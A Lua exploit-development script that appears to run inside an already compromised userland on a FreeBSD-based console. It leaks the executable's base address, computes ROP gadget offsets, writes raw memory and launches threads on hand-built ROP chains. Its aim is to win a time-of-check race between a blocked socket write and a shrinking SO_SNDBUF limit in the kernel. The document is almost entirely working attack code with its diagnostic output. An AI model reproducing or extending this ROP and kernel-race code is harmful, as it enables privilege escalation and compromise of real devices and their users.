-- CRASH_CLASS: MODERATE
-- PROBE 93c3: SO_SNDBUF race — 384b-pattern child write

print("=== PROBE 93c3 ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function fmt(val)
    if val == nil then return "nil" end
    if type(val) == "table" and val.h then
        return string.format("0x%08X%08X", val.h, val.l)
    end
    return string.format("0x%X", N(val))
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))
print("eb=" .. fmt(eb))

local g_pop_rax  = eb + 0x992
local g_pop_rdi  = eb + 0xC9DFE
local g_pop_rsi  = eb + 0xD77D
local g_pop_rdx  = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

-- Ignore SIGPIPE
local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(13), sa, uint64(0)) end)

-- Fake TCB for sysarch
local fake_tcb = memory.alloc(0x1000)
for i = 0, 0xFFC, 4 do wd(N(fake_tcb) + i, 0) end
wq(N(fake_tcb), uint64(N(fake_tcb)))
local fsbase_ptr = memory.alloc(8)
wq(N(fsbase_ptr), uint64(N(fake_tcb)))

-- Shared buffers
local sv = memory.alloc(4)
local ov = memory.alloc(4)
local ol = memory.alloc(4)
local dbuf = memory.alloc(0x1000)
local fill_buf = memory.alloc(256)

-- [A] First: sanity — replicate 384b write test exactly
print("")
print("[A] 384b-pattern write sanity")

local sp = memory.alloc(8)
wd(N(sp), 0); wd(N(sp)+4, 0)
local r = sgn(mk(135)(uint64(1), uint64(2), uint64(0), sp))
local test_rfd = rd(N(sp)) or -1
local test_wfd = rd(N(sp)+4) or -1
print("sp=" .. r .. " r=" .. test_rfd .. " w=" .. test_wfd)

-- Data to write
local wdata = memory.alloc(16)
wd(N(wdata), 0x44434241)
wd(N(wdata)+4, 0x34333231)

-- Result slot
local res = memory.alloc(8)
wq(N(res), uint64(0xDEADDEAD))

-- Stack + ROP — exactly 384b pattern
local stk_a = memory.alloc(0x4000)
local sb_a = N(stk_a)
local ss_a = 0x2000
local rsp_a = sb_a + ss_a - ((sb_a + ss_a) % 16) - 8
local off = 0
local function emit_a(v) wq(rsp_a + off, v); off = off + 8 end

-- rdi = arg = test_wfd (from thr_new)
-- Chain: pop_rsi(buf), pop_rdx(8), pop_rax(4=write), fn_addr,
--        pop_rdi(res), mov_[rdi]_rax, pop_rdi(0), pop_rax(431), fn_addr
emit_a(g_pop_rsi);    emit_a(uint64(N(wdata)))
emit_a(g_pop_rdx);    emit_a(uint64(8))
emit_a(g_pop_rax);    emit_a(uint64(4))
emit_a(stub)
emit_a(g_pop_rdi);    emit_a(uint64(N(res)))
emit_a(g_mov_m_rax)
emit_a(g_pop_rdi);    emit_a(uint64(0))
emit_a(g_pop_rax);    emit_a(uint64(431))
emit_a(stub)

-- thr_param
local par_a = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(par_a) + i, 0) end
wq(N(par_a), g_bare_ret)
wq(N(par_a) + 8, uint64(test_wfd))  -- arg = wfd → rdi
wq(N(par_a) + 0x10, uint64(sb_a))
wq(N(par_a) + 0x18, uint64(ss_a))
local tid_a = memory.alloc(8); wq(N(tid_a), uint64(0))
wq(N(par_a) + 0x30, tid_a)

pcall(function() mk(455)(par_a, uint64(0x38)) end)
for w = 1, 50000 do local _ = rd(sb_a) end

local res_lo = rd(N(res)) or 0xDEAD
print("write_ret=" .. res_lo)

-- Read from socketpair
local rbuf = memory.alloc(16)
for i = 0, 12, 4 do wd(N(rbuf) + i, 0) end
pcall(function() mk(3)(uint64(test_rfd), rbuf, uint64(16)) end)
local d0 = rd(N(rbuf)) or 0
print(string.format("readback=0x%08X (expect 0x44434241)", d0))

pcall(function() mk(6)(uint64(test_rfd)) end)
pcall(function() mk(6)(uint64(test_wfd)) end)

if res_lo ~= 8 then
    print("child write FAILED — aborting race")
    print("=== 93c3 COMPLETE ===")
    return
end
print("child write OK")

if not alive() then print("DEAD"); print("=== 93c3 COMPLETE ==="); return end

-- [B] RACE: child does BLOCKING write on full buffer, main shrinks hiwat
print("")
print("[B] RACE TRIALS")
local TRIALS = 10
local anomalies = 0

for trial = 1, TRIALS do
    if not alive() then print("DEAD at t" .. trial); break end

    -- Result slot
    wq(N(res), uint64(0xDEADDEAD))

    -- socketpair (SOCK_STREAM for blocking writes)
    wd(N(sp), 0); wd(N(sp)+4, 0)
    local sr = sgn(mk(135)(uint64(1), uint64(1), uint64(0), sp))
    if sr ~= 0 then print("t" .. trial .. ": sp fail"); break end
    local fW = rd(N(sp)) or -1
    local fR = rd(N(sp)+4) or -1

    -- SO_SNDBUF = 65536
    wd(N(sv), 65536)
    pcall(function() mk(105)(uint64(fW), uint64(0xFFFF), uint64(0x1001), sv, uint64(4)) end)

    -- Fill to capacity with MSG_DONTWAIT
    local filled = 0
    for i = 1, 300 do
        local ok2, ret = pcall(function()
            return mk(133)(uint64(fW), uint64(N(fill_buf)), uint64(256), uint64(0x80))
        end)
        if not ok2 then break end
        local v = sgn(ret)
        if v <= 0 then break end
        filled = filled + v
    end

    -- Child chain: sysarch(SET_FSBASE) then write(fW, fill_buf, 4096) BLOCKING
    -- Need sysarch because the blocking write path touches errno via %fs:0
    off = 0
    for i = 0, ss_a - 1, 4 do wd(sb_a + i, 0) end
    rsp_a = sb_a + ss_a - ((sb_a + ss_a) % 16) - 8

    -- sysarch(129, &fsbase_ptr) — rdi=129 via pop, not via arg
    emit_a(g_pop_rdi); emit_a(uint64(129))
    emit_a(g_pop_rsi); emit_a(uint64(N(fsbase_ptr)))
    emit_a(g_pop_rax); emit_a(uint64(165))
    emit_a(stub)
    -- write(fW, fill_buf, 4096) — BLOCKING
    emit_a(g_pop_rdi); emit_a(uint64(fW))
    emit_a(g_pop_rsi); emit_a(uint64(N(fill_buf)))
    emit_a(g_pop_rdx); emit_a(uint64(0x1000))
    emit_a(g_pop_rax); emit_a(uint64(4))
    emit_a(stub)
    -- store result
    emit_a(g_pop_rdi); emit_a(uint64(N(res)))
    emit_a(g_mov_m_rax)
    -- thr_exit
    emit_a(g_pop_rdi); emit_a(uint64(0))
    emit_a(g_pop_rax); emit_a(uint64(431))
    emit_a(stub)

    -- thr_param — arg unused (we set rdi via pop_rdi in the chain)
    for i = 0, 0x3C, 4 do wd(N(par_a) + i, 0) end
    wq(N(par_a), g_bare_ret)
    wq(N(par_a) + 0x08, uint64(0))
    wq(N(par_a) + 0x10, uint64(sb_a))
    wq(N(par_a) + 0x18, uint64(ss_a))
    wq(N(par_a) + 0x30, tid_a)

    pcall(function() mk(455)(par_a, uint64(0x38)) end)

    -- Let child enter write() and block in sbwait
    for w = 1, 10000 do local _ = rd(sb_a) end

    -- *** SHRINK hiwat while child is blocked ***
    wd(N(sv), 1)
    pcall(function() mk(105)(uint64(fW), uint64(0xFFFF), uint64(0x1001), sv, uint64(4)) end)
    wd(N(ov), 0); wd(N(ol), 4)
    pcall(function() mk(118)(uint64(fW), uint64(0xFFFF), uint64(0x1001), ov, ol) end)
    local hiwat = rd(N(ov)) or -1

    -- Drain read side → wakes child
    local drain1 = 0
    for d = 1, 100 do
        local ok4, dr = pcall(function()
            return mk(29)(uint64(fR), uint64(N(dbuf)), uint64(0x1000), uint64(0x80))
        end)
        if not ok4 then break end
        local dv = sgn(dr)
        if dv <= 0 then break end
        drain1 = drain1 + dv
    end

    -- Wait for child
    for w = 1, 200000 do local _ = rd(sb_a) end

    local cret = rd(N(res)) or 0xDEAD
    local cret_hi = rd(N(res)+4) or 0
    if cret_hi == 0xFFFFFFFF then cret = -(0x100000000 - cret) end

    -- Drain child's data
    local drain2 = 0
    for d = 1, 100 do
        local ok5, dr = pcall(function()
            return mk(29)(uint64(fR), uint64(N(dbuf)), uint64(0x1000), uint64(0x80))
        end)
        if not ok5 then break end
        local dv = sgn(dr)
        if dv <= 0 then break end
        drain2 = drain2 + dv
    end

    local anom = (cret > 0 and cret ~= 0xDEAD and cret ~= 0xDEADDEAD and hiwat <= 64)
    if anom then anomalies = anomalies + 1 end

    print(string.format("t%d: fill=%d hw=%d d1=%d cw=%d d2=%d%s",
        trial, filled, hiwat, drain1, cret, drain2,
        anom and " ***RACE***" or ""))

    pcall(function() mk(6)(uint64(fW)) end)
    pcall(function() mk(6)(uint64(fR)) end)
end

print("")
print(string.format("anomalies=%d/%d alive=%s", anomalies, TRIALS, alive() and "Y" or "N"))
if anomalies > 0 then print("*** TOCTOU RACE CONFIRMED ***") end
print("=== 93c3 COMPLETE ===")
